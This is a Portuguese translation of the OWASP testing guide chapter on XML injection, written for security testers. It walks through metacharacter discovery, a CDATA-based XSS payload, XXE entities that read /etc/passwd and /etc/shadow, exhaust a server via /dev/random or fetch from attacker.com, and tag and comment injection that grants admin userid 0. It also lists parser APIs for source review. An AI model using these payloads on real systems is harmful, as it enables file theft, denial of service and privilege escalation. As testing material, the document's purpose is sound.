# Testando Injeção XML

|ID          |
|------------|
|WSTG-INPV-07|

## Resumo

O teste de injeção XML ocorre quando um testador tenta injetar um documento XML na aplicação. Se o analisador XML falhar em validar contextualmente os dados, o teste resultará em um resultado positivo.

Esta seção descreve exemplos práticos de Injeção XML. Primeiramente, será definida uma comunicação em estilo XML e explicados seus princípios de funcionamento. Em seguida, o método de descoberta, no qual tentamos inserir metacaracteres XML. Uma vez concluída a primeira etapa, o testador terá algumas informações sobre a estrutura XML, então será possível tentar injetar dados e tags XML (Injeção de Tag).

## Objetivos do Teste

- Identificar pontos de injeção XML.
- Avaliar os tipos de exploits que podem ser alcançados e suas severidades.

## Como Testar

Vamos supor que existe uma aplicação web usando uma comunicação em estilo XML para realizar o registro de usuário. Isso é feito criando e adicionando um novo nó `usuário` em um arquivo `xmlDb`.

Vamos supor que o arquivo xmlDB seja como o seguinte:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<usuários>
    <usuário>
        <nome_de_usuário>gandalf</nome_de_usuário>
        <senha>!c3</senha>
        <userid>0</userid>
        <email>gandalf@middleearth.com</email>
    </usuário>
    <usuário>
        <nome_de_usuário>Stefan0</nome_de_usuário>
        <senha>w1s3c</senha>
        <userid>500</userid>
        <email>Stefan0@whysec.hmm</email>
    </usuário>
</usuários>
```

Quando um usuário se registra preenchendo um formulário HTML, a aplicação recebe os dados do usuário em uma solicitação padrão, que, para simplificar, será suposta ser enviada como uma solicitação `GET`.

Por exemplo, os seguintes valores:

```txt
Nome de usuário: tony
Senha: Un6R34kb!e
E-mail: s4tan@hell.com
```

vão produzir a solicitação:

`http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

A aplicação, então, cria o seguinte nó:

```xml
<usuário>
    <nome_de_usuário>tony</nome_de_usuário>
    <senha>Un6R34kb!e</senha>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</usuário>
```

que será adicionado ao xmlDB:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<usuários>
    <usuário>
        <nome_de_usuário>gandalf</nome_de_usuário>
        <senha>!c3</senha>
        <userid>0</userid>
        <email>gandalf@middleearth.com</email>
    </usuário>
    <usuário>
        <nome_de_usuário>Stefan0</nome_de_usuário>
        <senha>w1s3c</senha>
        <userid>500</userid>
        <email>Stefan0@whysec.hmm</email>
    </usuário>
    <usuário>
        <nome_de_usuário>tony</nome_de_usuário>
        <senha>Un6R34kb!e</senha>
        <userid>500</userid>
        <email>s4tan@hell.com</email>
    </usuário>
</usuários>
```

### Descoberta

O primeiro passo para testar uma aplicação em busca da presença de uma vulnerabilidade de Injeção XML consiste em tentar inserir metacaracteres XML.

Os metacaracteres XML são:

- Aspas simples: `'` - Quando não sanitizado, este caractere pode gerar uma exceção durante a análise XML, se o valor injetado for parte de um valor de atributo em uma tag.

Por exemplo, vamos supor que exista o seguinte atributo:

`<nó atributo='$valorDeEntrada'/>`

Então, se:

`valorDeEntrada = foo'`

for instanciado e então inserido como o valor do atributo:

`<nó atributo='foo''/>`

então, o documento XML resultante não está bem formado.

- Aspas duplas: `"` - este caractere tem o mesmo significado que a aspa simples e pode ser usado se o valor do atributo estiver entre aspas duplas.

`<nó atributo="$valorDeEntrada"/>`

Então, se:

`$valorDeEntrada = foo"`

a substituição resulta em:

`<nó atributo="foo""/>`

e o documento XML resultante é inválido.

- Parênteses angulares: `>` e `<` - Adicionando um parêntese angular aberto ou fechado em uma entrada de usuário como o seguinte:

`Nome de usuário = foo<`

a aplicação criará um novo nó:

```xml
<usuário>
    <nome_de_usuário>foo<</nome_de_usuário>
    <senha>Un6R34kb!e</senha>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</usuário>
```

mas, devido à presença do '<' aberto, o documento XML resultante é inválido.

- Tag de comentário: `<!--/-->` - Esta sequência de caracteres é interpretada como o início/fim de um comentário. Portanto, ao injetar um deles no parâmetro de Nome de usuário:

`Nome de usuário = foo<!--`

a aplicação criará um nó como o seguinte:

```xml
<usuário>
    <nome_de_usuário>foo<!--</nome_de_usuário>
    <senha>Un6R34kb!e</senha>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</usuário>
```

que não será uma sequência XML válida.

- E comercial: `&` - O e comercial é usado na sintaxe XML para representar entidades. O formato de uma entidade é `&símbolo;`. Uma entidade é mapeada para um caractere no conjunto de caracteres Unicode.

Por exemplo:

`<nótag>&lt;</nótag>`

é bem formado e válido, e representa o caractere `<` ASCII.

Se `&` não for cod

ificado com `&amp;`, ele pode ser usado para testar a injeção XML.

Na verdade, se uma entrada como a seguinte for fornecida:

`Nome de usuário = &foo`

um novo nó será criado:

```xml
<usuário>
    <nome_de_usuário>&foo</nome_de_usuário>
    <senha>Un6R34kb!e</senha>
    <userid>500</userid>
    <email>s4tan@hell.com</email>
</usuário>
```

mas, novamente, o documento não é válido: `&foo` não é terminado com `;` e a entidade `&foo;` é indefinida.

- Delimitadores de seção CDATA: `<!\[CDATA\[ / ]]>` - Seções CDATA são usadas para escapar blocos de texto contendo caracteres que, de outra forma, seriam reconhecidos como marcação. Em outras palavras, caracteres incluídos em uma seção CDATA não são analisados por um analisador XML.

Por exemplo, se houver a necessidade de representar a string `<foo>` dentro de um nó de texto, uma seção CDATA pode ser usada:

```xml
<nó>
    <![CDATA[<foo>]]>
</nó>
```

para que `<foo>` não seja analisado como marcação e seja considerado como dados de caractere.

Se um nó for criado da seguinte maneira:

`<nome_de_usuário><![CDATA[<$nomeDeUsuário]]></nome_de_usuário>`

o testador poderia tentar injetar a string de final de CDATA `]]>` para tentar invalidar o documento XML.

`nomeDeUsuário = ]]>`

isso se tornará:

`<nome_de_usuário><![CDATA[]]>]]></nome_de_usuário>`

que não é um fragmento XML válido.

Outro teste está relacionado à tag CDATA. Suponha que o documento XML seja processado para gerar uma página HTML. Neste caso, os delimitadores de seção CDATA podem ser simplesmente eliminados, sem inspecionar mais seus conteúdos. Então, é possível injetar tags HTML, que serão incluídas na página gerada, contornando completamente rotinas de saneamento existentes.

Vamos considerar um exemplo concreto. Suponha que tenhamos um nó contendo algum texto que será exibido de volta ao usuário.

```xml
<html>
    $HTMLCode
</html>
```

Então, um atacante pode fornecer a seguinte entrada:

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

e obter o seguinte nó:

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

Durante o processamento, os delimitadores de seção CDATA são eliminados, gerando o seguinte código HTML:

```html
<script>
    alert('XSS')
</script>
```

O resultado é que a aplicação é vulnerável a XSS.

Entidade Externa: O conjunto de entidades válidas pode ser estendido definindo novas entidades. Se a definição de uma entidade for uma URI, a entidade é chamada de entidade externa. A menos que configuradas de outra forma, as entidades externas forçam o analisador XML a acessar o recurso especificado pela URI, por exemplo, um arquivo na máquina local ou em sistemas remotos. Este comportamento expõe a aplicação a ataques de Entidade Externa XML (XXE), que podem ser usados para realizar negação de serviço no sistema local, obter acesso não autorizado a arquivos na máquina local, escanear máquinas remotas e realizar negação de serviço em sistemas remotos.

Para testar vulnerabilidades XXE, pode-se usar a seguinte entrada:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

Este teste pode travar o servidor web (em um sistema UNIX), se o analisador XML tentar substituir a entidade pelo conteúdo do arquivo /dev/random.

Outros testes úteis são os seguintes:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

### Injeção de Tag

Uma vez concluída a primeira etapa, o testador terá algumas informações sobre a estrutura do documento XML. Então, é possível tentar injetar dados e tags XML. Vamos mostrar um exemplo de como isso pode levar a um ataque de escalonamento de privilégios.

Vamos considerar a aplicação anterior. Ao inserir os seguintes valores:

```txt
Nome de usuário: tony
Senha: Un6R34kb!e
E-mail: s4tan@hell.com</email><userid>0</userid><email>s4tan@hell.com
```

a aplicação criará um novo nó e o anexará ao banco de dados XML:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<usuários>
    <usuário>
        <nome_de_usuário>gandalf</nome_de_usuário>
        <senha>!c3</senha>
        <userid>0</userid>
        <email>gandalf@middleearth.com</email>
    </usuário>
    <usuário>
        <nome_de_usuário>Stefan0</nome_de_usuário>
        <senha>w1s3c</senha>
        <userid>500</userid>
        <email>Stefan0@whysec.hmm</email>
    </usuário>
    <usuário>
        <nome_de_usuário>tony</

nome_de_usuário>
        <senha>Un6R34kb!e</senha>
        <userid>500</userid>
        <email>s4tan@hell.com</email>
        <userid>0</userid>
        <email>s4tan@hell.com</email>
    </usuário>
</usuários>
```

O arquivo XML resultante está bem formado. Além disso, é provável que, para o usuário tony, o valor associado à tag userid seja o que aparece por último, ou seja, 0 (o ID do administrador). Em outras palavras, injetamos um usuário com privilégios administrativos.

O único problema é que a tag userid aparece duas vezes no último nó de usuário. Frequentemente, os documentos XML estão associados a um esquema ou a um DTD e serão rejeitados se não estiverem em conformidade com ele.

Vamos supor que o documento XML seja especificado pelo seguinte DTD:

```xml
<!DOCTYPE usuários [
    <!ELEMENT usuários (usuário+) >
    <!ELEMENT usuário (nome_de_usuário,senha,userid,email+) >
    <!ELEMENT nome_de_usuário (#PCDATA) >
    <!ELEMENT senha (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT email (#PCDATA) >
]>
```

Note que o nó userid é definido com cardinalidade 1. Neste caso, o ataque que mostramos antes (e outros ataques simples) não funcionarão se o documento XML for validado contra seu DTD antes de qualquer processamento ocorrer.

No entanto, este problema pode ser resolvido se o testador controlar o valor de alguns nós que precedem o nó ofensivo (userid, neste exemplo). Na verdade, o testador pode comentar tal nó, injetando uma sequência de início/fim de comentário:

```txt
Nome de usuário: tony
Senha: Un6R34kb!e</senha><!--
E-mail: --><userid>0</userid><email>s4tan@hell.com
```

Neste caso, o banco de dados XML final é:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<usuários>
    <usuário>
        <nome_de_usuário>gandalf</nome_de_usuário>
        <senha>!c3</senha>
        <userid>0</userid>
        <email>gandalf@middleearth.com</email>
    </usuário>
    <usuário>
        <nome_de_usuário>Stefan0</nome_de_usuário>
        <senha>w1s3c</senha>
        <userid>500</userid>
        <email>Stefan0@whysec.hmm</email>
    </usuário>
    <usuário>
        <nome_de_usuário>tony</nome_de_usuário>
        <senha>Un6R34kb!e</senha><!--</senha>
        <userid>500</userid>
        <email>--><userid>0</userid><email>s4tan@hell.com</email>
    </usuário>
</usuários>
```

O nó userid original foi comentado, deixando apenas o injetado. O documento agora está em conformidade com as regras do seu DTD.

## Revisão do Código Fonte

As seguintes APIs Java podem ser vulneráveis a XXE se não estiverem configuradas corretamente.

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

Verifique o código fonte se o docType, DTD externo e entidades de parâmetro externo estão configurados como usos proibidos.

- [Folha de Dicas de Prevenção de Entidade Externa XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

Além disso, o leitor de escritório Java POI pode ser vulnerável a XXE se a versão for anterior a 3.10.1.

A versão da biblioteca POI pode ser identificada pelo nome do arquivo JAR. Por exemplo,

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

As palavras-chave do código fonte a seguir podem ser aplicáveis ao C.

- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

## Ferramentas

- [Strings de Injeção XML (da ferramenta wfuzz)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## Referências

- [Injeção XML](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "Ataque XXE (Xml eXternal Entity)"](https://www.securityfocus.com/archive/1/297714)
- [Folha de Dicas de Prevenção de Entidade Externa XML (XXE) da OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)